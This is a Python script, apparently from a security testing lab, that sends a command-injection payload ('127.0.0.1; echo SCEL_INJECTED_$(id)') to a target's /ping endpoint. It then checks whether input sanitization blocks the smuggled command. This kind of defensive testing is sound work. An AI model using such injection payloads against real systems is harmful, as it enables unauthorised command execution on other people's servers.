"""
Command Injection Attack
=========================
Simulates an OS command injection via the /ping endpoint.

Behaviour with controls:
    ✅ INPUT_SANITIZATION ON  → input validated (digits/dots only), attack blocked
    ❌ INPUT_SANITIZATION OFF → raw input passed to os.popen(), command executes

Output:
    {
        "attack": "command_injection",
        "attack_type": "Command Injection",
        "success": true/false,
        "tte": <seconds>,
        "attempts": 1,
        "details": "..."
    }
"""

import time
import requests

from config import TARGET_URL

# Payload: valid-looking prefix + injected command
PAYLOAD = "127.0.0.1; echo SCEL_INJECTED_$(id)"


def run_command_injection(verbose: bool = True) -> dict:
    """
    Execute a command injection attack against /ping.

    Returns:
        dict with keys: attack, attack_type, success, tte, attempts, details
    """
    ping_url = f"{TARGET_URL}/ping"
    start_time = time.time()

    if verbose:
        print(f"\n{'='*60}")
        print(f"  💉 COMMAND INJECTION ATTACK")
        print(f"  Target  : {ping_url}")
        print(f"  Payload : {PAYLOAD!r}")
        print(f"{'='*60}\n")

    try:
        resp = requests.post(
            ping_url,
            data={"ip": PAYLOAD},
            timeout=10,
        )
    except requests.ConnectionError:
        elapsed = round(time.time() - start_time, 4)
        details = "Connection refused — is the target webapp running?"
        if verbose:
            print(f"  ❌ {details}")
        return {
            "attack": "command_injection",
            "attack_type": "Command Injection",
            "success": False,
            "tte": elapsed,
            "attempts": 1,
            "details": details,
        }

    elapsed = round(time.time() - start_time, 4)
    body = resp.text

    # Injection succeeded if our marker appears in stdout
    if "SCEL_INJECTED_" in body:
        success = True
        details = f"Command executed — output contains injected marker. Response snippet: {body[:200]!r}"
        if verbose:
            print(f"  💥 INJECTION SUCCESS — server executed our command")
            print(f"  Response: {body[:200]!r}")
    elif "Invalid IP Address" in body:
        success = False
        details = "Blocked by input sanitization — invalid IP address rejected"
        if verbose:
            print(f"  🛡️  Blocked by input sanitization")
    else:
        # Sanitization ON still runs ping on the sanitized portion; no injection marker
        success = False
        details = f"No injection marker in response (sanitized). Status={resp.status_code}"
        if verbose:
            print(f"  🛡️  No injection marker found — sanitization active")

    result = {
        "attack": "command_injection",
        "attack_type": "Command Injection",
        "success": success,
        "tte": elapsed,
        "attempts": 1,
        "details": details,
    }

    if verbose:
        print(f"\n{'─'*60}")
        print(f"  Result  : {'✅ SUCCESS' if success else '❌ FAILED'}")
        print(f"  TTE     : {elapsed}s")
        print(f"  Details : {details}")
        print(f"{'─'*60}\n")

    return result


# ─── Standalone execution ────────────────────────────────────────────────────
if __name__ == "__main__":
    result = run_command_injection()
    print("\nRaw result:")
    import json
    print(json.dumps(result, indent=2))
